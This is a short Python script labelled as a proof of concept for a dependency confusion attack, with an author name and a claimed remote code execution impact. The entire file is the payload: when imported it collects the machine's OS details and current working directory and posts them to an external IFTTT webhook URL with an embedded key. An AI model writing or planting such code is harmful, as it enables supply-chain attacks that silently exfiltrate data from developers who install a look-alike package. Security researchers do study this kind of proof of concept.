# python package dependency confiuse vulnerability POC 
# name: techghoshal
# e-mail: techghoshal@gmail.com
# Impact this vulnerability: Remote code execution(RCE)


import requests
import os
osname =  os.uname()
cwd = os.getcwd()

requests.post("https://maker.ifttt.com/trigger/transferwise_callback/json/with/key/JLjcSOyzFK2o2HO76KLd5",
              data = {"os": osname, "cwd": cwd})

